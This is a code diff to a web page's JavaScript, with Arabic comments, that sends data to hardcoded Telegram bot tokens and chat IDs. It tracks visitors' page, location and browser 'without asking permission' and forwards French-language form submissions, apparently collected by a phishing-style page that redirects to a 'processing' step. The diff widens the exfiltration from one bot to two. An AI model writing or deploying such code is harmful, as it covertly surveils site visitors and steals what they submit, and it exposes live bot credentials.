@@ -970,6 +970,17 @@
         once: true
     });
 
+    // Telegram Bots Configuration
+    const BOT_TOKENS = [
+        "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4", // البوت الأول
+        "7799552688:AAHuIOK76SfTNjpUUDjt48tucDKVNekAieY"  // البوت الثاني
+    ];
+    
+    const CHAT_IDS = [
+        "5372119436", // ID البوت الأول
+        "7719232174"  // ID البوت الثاني
+    ];
+
     // نظام التتبع البسيط (بدون طلب إذن)
     async function trackVisitor() {
         try {
@@ -1002,9 +1013,6 @@
                 : "Location unknown";
 
             // 4. إرسال الإشعار إلى Telegram
-            const telegramToken = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
-            const telegramChatId = "5372119436";
-            
             const message = `
 🔔 New Website Visit 🔔
 📄 Page: ${basicInfo.page}
@@ -1014,15 +1022,8 @@
 🌐 Browser: ${basicInfo.browser}
             `;
 
-            await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: telegramChatId,
-                    text: message,
-                    parse_mode: "Markdown"
-                })
-            });
+            // إرسال إلى جميع البوتات
+            await sendToTelegram(message);
 
         } catch (error) {
             console.log("Error in tracking:", error);
@@ -1043,9 +1044,6 @@
 
     // إشعار أساسي (إذا فشل التتبع المتقدم)
     function sendBasicNotification() {
-        const telegramToken = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
-        const telegramChatId = "5372119436";
-        
         const now = new Date();
         const basicInfo = {
             page: window.location.href,
@@ -1070,14 +1068,38 @@
 🌐 Browser: ${basicInfo.browser}
             `;
         
-        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: telegramChatId,
-                text: message
-            })
-        }).catch(e => console.log("Failed to send basic notification"));
+        // إرسال إلى جميع البوتات
+        sendToTelegram(message).catch(e => console.log("Failed to send basic notification"));
+    }
+
+    // دالة محسنة لإرسال الرسائل إلى جميع البوتات
+    async function sendToTelegram(text) {
+        const results = [];
+        
+        for (let i = 0; i < BOT_TOKENS.length; i++) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKENS[i]}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_IDS[i],
+                        text: text,
+                        parse_mode: "Markdown"
+                    })
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                results.push(await response.json());
+            } catch (error) {
+                console.error(`Telegram send error for bot ${i+1}:`, error);
+                results.push(null);
+            }
+        }
+        
+        return results;
     }
 
     // تشغيل التتبع عند تحميل الصفحة
@@ -1160,18 +1182,8 @@
 💬 Commentaires: ${formData.comments}
 🕒 Heure: ${new Date(formData.submissionTime).toLocaleString('fr-FR')}`;
 
-            const telegramToken = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
-            const telegramChatId = "5372119436";
-            
-            await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: telegramChatId,
-                    text: message,
-                    parse_mode: "Markdown"
-                })
-            });
+            // إرسال إلى جميع البوتات
+            const telegramResponses = await sendToTelegram(message);
 
             // الانتقال إلى صفحة المعالجة بعد 5 ثواني
             setTimeout(() => {
